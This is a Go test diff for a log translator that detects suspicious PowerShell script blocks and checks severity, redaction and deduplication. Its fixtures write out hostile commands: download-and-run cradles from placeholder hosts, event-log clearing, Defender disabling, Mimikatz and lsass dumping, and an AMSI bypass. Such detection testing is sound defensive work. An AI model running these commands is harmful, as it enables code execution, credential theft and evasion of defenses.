@@ -257,6 +257,107 @@ func TestAdmToolkitCompatibility(t *testing.T) {
 	}
 }
 
+// ps builds a PowerShell script block (4104) event for tests.
+func ps(level int, id, part, total, text string) *Raw {
+	return &Raw{Provider: "Microsoft-Windows-PowerShell", Channel: "Microsoft-Windows-PowerShell/Operational", EventID: 4104,
+		Level: level, Computer: "WS-07", UserSID: "S-1-5-21-1-2-3-1001", Time: time.Date(2026, 9, 29, 9, 0, 0, 0, time.UTC),
+		Data: map[string]string{"MessageNumber": part, "MessageTotal": total, "ScriptBlockText": text,
+			"ScriptBlockId": id, "Path": `C:\Users\jsmith\run.ps1`}}
+}
+
+func TestPowerShellScriptBlocks(t *testing.T) {
+	tr := NewTranslator()
+	tr.ResolveSID = func(sid string) string {
+		if sid == "S-1-5-21-1-2-3-1001" {
+			return "jsmith"
+		}
+		return ""
+	}
+
+	// Routine scripts are not reported.
+	if e := tr.Translate(ps(5, "a1", "1", "1", `Get-ChildItem C:\Temp | Where-Object Length -gt 1MB`)); e != nil {
+		t.Errorf("benign script reported: %+v", e)
+	}
+	// Module logging is skipped.
+	mod := ps(4, "", "", "", "")
+	mod.EventID = 4103
+	if e := tr.Translate(mod); e != nil {
+		t.Errorf("4103 reported: %+v", e)
+	}
+
+	// Script blocks PowerShell flags itself (warning level) are Medium.
+	w := tr.Translate(ps(3, "a2", "1", "1", "$k = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p, $t)"))
+	if w == nil || w.Action != "powershell_suspicious" || w.Severity != event.SevMedium || w.User != "jsmith" ||
+		!strings.Contains(w.Summary, "jsmith ran a PowerShell script that PowerShell itself flagged as suspicious: $k =") {
+		t.Errorf("warning-level script block: %+v", w)
+	}
+
+	cases := []struct {
+		text, action, line string
+		cat                event.Category
+	}{
+		{"$u = 'http://10.1.1.9/a.ps1'\n(New-Object Net.WebClient).DownloadString($u) | IEX", "powershell_download", "(New-Object Net.WebClient).DownloadString($u) | IEX", event.CatOther},
+		{"iex ([Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b)))", "powershell_download", "iex (", event.CatOther},
+		{"Write-Host 'cleanup'\nwevtutil   cl Security\n", "powershell_tamper", "wevtutil   cl Security", event.CatIntegrity},
+		{"Stop-Service -Name EventLog -Force", "powershell_tamper", "Stop-Service -Name EventLog", event.CatIntegrity},
+		{"Set-MpPreference -DisableRealtimeMonitoring $true", "powershell_av_tamper", "Set-MpPreference -DisableRealtimeMonitoring $true", event.CatOther},
+		{`Add-MpPreference -ExclusionPath C:\Users\Public`, "powershell_av_tamper", "Add-MpPreference", event.CatOther},
+		{"Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'", "powershell_credential", "Invoke-Mimikatz", event.CatOther},
+		{`Get-Process lsass | Out-Minidump -DumpFilePath C:\Temp`, "powershell_credential", "Out-Minidump", event.CatOther},
+		{"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", "powershell_amsi_bypass", "AmsiUtils", event.CatOther},
+	}
+	for _, c := range cases {
+		e := tr.Translate(ps(5, "b1", "1", "1", c.text))
+		if e == nil || e.Action != c.action || e.Severity != event.SevHigh || e.Category != c.cat ||
+			!strings.HasPrefix(e.Summary, "jsmith ran a PowerShell script that ") || !strings.Contains(e.Summary, c.line) {
+			t.Errorf("%q: %+v", c.text, e)
+		}
+	}
+
+	// Re-enabling Defender, and downloading without running, are not reported.
+	for _, text := range []string{"Set-MpPreference -DisableRealtimeMonitoring $false",
+		"Invoke-WebRequest https://intranet/setup.msi -OutFile setup.msi"} {
+		if e := tr.Translate(ps(5, "c1", "1", "1", text)); e != nil {
+			t.Errorf("%q reported: %+v", text, e)
+		}
+	}
+
+	// Passwords in a script are hidden in the summary and details.
+	pw := tr.Translate(ps(5, "d1", "1", "1", "$env:DB_PASSWORD='Qx7!Harbor'; $p = ConvertTo-SecureString 'P@ssw0rd!9' -AsPlainText -Force; wevtutil cl System"))
+	if pw == nil || !strings.Contains(pw.Summary, "********") {
+		t.Fatalf("tamper script with a password: %+v", pw)
+	}
+	all := pw.Summary
+	for _, d := range pw.Details {
+		all += " " + d.Value
+	}
+	for _, v := range pw.Fields {
+		all += " " + v
+	}
+	if strings.Contains(all, "Qx7!Harbor") || strings.Contains(all, "P@ssw0rd!9") {
+		t.Errorf("password shown in the report: %s", all)
+	}
+	if !hasDetail(pw, "Script (excerpt)") || !hasDetail(pw, "Script path") || !hasDetail(pw, "Script block ID") {
+		t.Errorf("details: %+v", pw.Details)
+	}
+
+	// Matching parts of one large script share a key, so they become one row.
+	p1 := tr.Translate(ps(5, "{E1B2}", "1", "3", "IEX (New-Object Net.WebClient).DownloadString('http://x/1')"))
+	p2 := tr.Translate(ps(5, "{E1B2}", "3", "3", "Clear-EventLog -LogName Security"))
+	if p1 == nil || p2 == nil || p1.DedupeKey == "" || p1.DedupeKey != p2.DedupeKey {
+		t.Errorf("parts of one script block: %+v / %+v", p1, p2)
+	}
+}
+
+func hasDetail(e *event.Event, label string) bool {
+	for _, d := range e.Details {
+		if d.Label == label && d.Value != "" {
+			return true
+		}
+	}
+	return false
+}
+
 func utf16le(s string) []byte {
 	var b []byte
 	for _, r := range utf16.Encode([]rune(s)) {
